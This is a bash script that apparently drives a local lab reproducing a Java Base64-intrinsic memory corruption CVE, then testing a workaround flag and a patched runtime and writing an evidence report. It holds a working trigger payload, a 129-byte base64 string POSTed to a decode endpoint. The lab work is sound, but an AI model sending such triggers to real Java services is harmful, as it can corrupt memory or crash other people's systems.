#!/usr/bin/env bash
# Runs the full lab on an x86-64 instance with AVX-512 VBMI.
# Usage:  ./deploy/run-on-instance.sh
#
# Optional variables:
#   JAVA_IMG=...        target base image (default eclipse-temurin:17.0.6_10-jdk)
#   PATCHED_IMAGE=...   patched image for the remediation test
#
# Everything listens on 127.0.0.1. No port is exposed outside the instance.

set -uo pipefail

LAB="$(cd "$(dirname "$0")/.." && pwd)"
cd "$LAB"

# On a freshly created instance the user may not be in the docker group yet.
# Re-run as root if access to the socket is denied.
if ! docker info >/dev/null 2>&1; then
  if sudo -n docker info >/dev/null 2>&1; then
    SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
    exec sudo -n "$SELF" "$@"
  fi
  echo "docker inaccessible: run 'newgrp docker' or reconnect SSH." >&2
  exit 1
fi

TS="$(date +%Y%m%d-%H%M%S)"
EVID="deploy/evidence/$TS"
mkdir -p "$EVID"

JAVA_IMG="${JAVA_IMG:-eclipse-temurin:17.0.6_10-jdk}"
PATCHED_IMAGE="${PATCHED_IMAGE:-}"
TARGET_IMG="j4s-target:lab"
PATCHED_TAG="j4s-target:patched"
NAME="j4s-target"
PORT="8080"
BASE="http://127.0.0.1:${PORT}"

say() { printf '\n== %s ==\n' "$*" | tee -a "$EVID/session.log"; }
rec() { tee -a "$EVID/session.log"; }
note() { printf '  %s\n' "$*" | tee -a "$EVID/session.log"; }

down() { docker rm -f "$NAME" >/dev/null 2>&1; }

wait_health() {
  for _ in $(seq 1 90); do
    curl -sf -m 2 "$BASE/health" >/dev/null 2>&1 && return 0
    sleep 1
  done
  return 1
}

# ---------------------------------------------------------------------------
say "1. Hardware gate"
NEED=(avx512f avx512bw avx512vbmi bmi2)
FLAGS="$(grep -m1 '^flags' /proc/cpuinfo | tr ' ' '\n')"
MISSING=()
for f in "${NEED[@]}"; do grep -qx "$f" <<<"$FLAGS" || MISSING+=("$f"); done
lscpu > "$EVID/lscpu.txt" 2>&1

if [ ${#MISSING[@]} -ne 0 ]; then
  note "CPU is missing: ${MISSING[*]}"
  note "ABORTING: this instance does not execute the vulnerable code."
  {
    echo "# CVE-2026-114938 report"
    echo
    echo "Status: **INCONCLUSIVE** — instance without AVX-512 VBMI."
    echo
    echo "Missing flags: ${MISSING[*]}"
    echo
    echo '```'; head -20 "$EVID/lscpu.txt"; echo '```'
  } > "$EVID/report.md"
  exit 2
fi
note "OK: all flags present ($(grep -m1 'model name' /proc/cpuinfo | cut -d: -f2- | xargs))"

# ---------------------------------------------------------------------------
say "2. Environment"
docker version --format 'docker {{.Server.Version}}' | rec
"$LAB/deploy/_in_jdk.sh" "$JAVA_IMG" 'java -version 2>&1; java -XX:+PrintFlagsFinal -version 2>/dev/null | grep -E "UseAVX|UseBASE64Intrinsics"' \
  2>&1 | tee "$EVID/jdk.txt"

# ---------------------------------------------------------------------------
say "3. Target build"
docker build -q -t "$TARGET_IMG" ./target >/dev/null 2>&1
if [ $? -ne 0 ]; then note "build failed"; exit 1; fi
note "image $TARGET_IMG ready"

# ---------------------------------------------------------------------------
say "4. Bounded PoC (safe) on the vulnerable runtime"
down
docker run --rm -v "$LAB/poc:/poc:ro" -w /poc "$JAVA_IMG" \
  sh -c 'javac -d /tmp/o Base64Trigger.java && java -cp /tmp/o Base64Trigger' \
  2>&1 | tee "$EVID/poc-vulnerable.txt"
if grep -q '^REPRODUCED' "$EVID/poc-vulnerable.txt"; then
  note "corruption REPRODUCED (62 bytes past the array)"
  BOUNDED="REPRODUCED"
else
  note "not reproduced on this runtime"
  BOUNDED="NOT REPRODUCED"
fi

# ---------------------------------------------------------------------------
say "5. Trigger on the realistic path (/decode, internal allocation)"
docker run -d --name "$NAME" -p "127.0.0.1:${PORT}:8080" \
  -e JAVA_OPTS="-XX:ErrorFile=/app/hs_err_%p.log" "$TARGET_IMG" >/dev/null
if wait_health; then note "target up: $(curl -s "$BASE/health")"; else note "target did not start"; fi

VALID="$(python3 -c 'print("A"*64)')"
TRIG="$(python3 -c 'import sys;sys.stdout.write("A"*128+"=")')"   # 129 bytes

note "valid baseline -> $(curl -s -m 5 -X POST --data-binary "$VALID" "$BASE/decode-safe")"
: > "$EVID/trigger.log"
# a single shot: the first exception deoptimizes decode0
r="$(curl -s -m 30 -w '|http=%{http_code}' -X POST --data-binary "$TRIG" "$BASE/decode-exact")"
echo "len=${#TRIG} -> $r" >> "$EVID/trigger.log"
cat "$EVID/trigger.log" | tee -a "$EVID/session.log"

STATE="$(docker inspect -f '{{.State.Status}} restarts={{.RestartCount}}' "$NAME" 2>/dev/null)"
note "container state: $STATE"
docker logs "$NAME" > "$EVID/container.log" 2>&1
mkdir -p "$EVID/app"
docker cp "$NAME:/app/." "$EVID/app/" >/dev/null 2>&1
ls "$EVID/app" | grep -q 'hs_err' && note "hs_err captured in $EVID/app"

# ---------------------------------------------------------------------------
say "6. Workaround -XX:-UseBASE64Intrinsics"
down
docker run -d --name "$NAME" -p "127.0.0.1:${PORT}:8080" \
  -e JAVA_OPTS="-XX:-UseBASE64Intrinsics -XX:ErrorFile=/app/hs_err_%p.log" "$TARGET_IMG" >/dev/null
wait_health && note "target up: $(curl -s "$BASE/health")"
curl -s -m 5 -X POST --data-binary "$VALID" "$BASE/decode-safe" > "$EVID/workaround.txt"
echo " trigger129 -> $(curl -s -m 30 -X POST --data-binary "$TRIG" "$BASE/decode-exact")" >> "$EVID/workaround.txt"
cat "$EVID/workaround.txt" | tee -a "$EVID/session.log"
note "container: $(docker inspect -f '{{.State.Status}}' "$NAME")"

# ---------------------------------------------------------------------------
if [ -n "$PATCHED_IMAGE" ]; then
  say "7. Remediation: patched runtime ($PATCHED_IMAGE)"
  docker build -q --build-arg BASE_IMAGE="$PATCHED_IMAGE" -t "$PATCHED_TAG" ./target >/dev/null 2>&1
  docker run --rm -v "$LAB/poc:/poc:ro" -w /poc "$PATCHED_IMAGE" \
    sh -c 'javac -d /tmp/o Base64Trigger.java && java -cp /tmp/o Base64Trigger' \
    2>&1 | tee "$EVID/poc-patched.txt"
  grep -q '^REPRODUCED' "$EVID/poc-patched.txt" && PATCHED="STILL VULNERABLE" || PATCHED="fixed"
  note "result: $PATCHED"
else
  PATCHED="not tested (PATCHED_IMAGE not set)"
fi

# ---------------------------------------------------------------------------
say "8. Report"
down
{
  echo "# CVE-2026-114938 (Java4Shell) report"
  echo
  echo "- Date: $(date -Is)"
  echo "- Host: $(grep -m1 'model name' /proc/cpuinfo | cut -d: -f2- | xargs)"
  echo "- Target runtime: \`$JAVA_IMG\`"
  echo "- AVX-512 flags: present"
  echo
  echo "## Result"
  echo
  echo "| Test | Result |"
  echo "|---|---|"
  echo "| Bounded PoC (vulnerable) | $BOUNDED |"
  echo "| Container after trigger | $STATE |"
  echo "| Workaround \`-XX:-UseBASE64Intrinsics\` | $(tail -2 "$EVID/workaround.txt" | tr '\n' ' ') |"
  echo "| Remediation | $PATCHED |"
  echo
  echo "## Evidence"
  echo
  echo '```'
  echo "--- poc-vulnerable.txt"; cat "$EVID/poc-vulnerable.txt"
  echo "--- trigger.log"; cat "$EVID/trigger.log"
  echo "--- jdk.txt"; cat "$EVID/jdk.txt"
  echo '```'
  echo
  if [ -d "$EVID/app" ] && ls "$EVID/app" | grep -q 'hs_err'; then
    echo "## hs_err"
    echo
    echo '```'; head -40 "$EVID"/app/hs_err_*.log; echo '```'
  fi
} > "$EVID/report.md"

note "report: $EVID/report.md"
note "files: $(ls "$EVID" | tr '\n' ' ')"
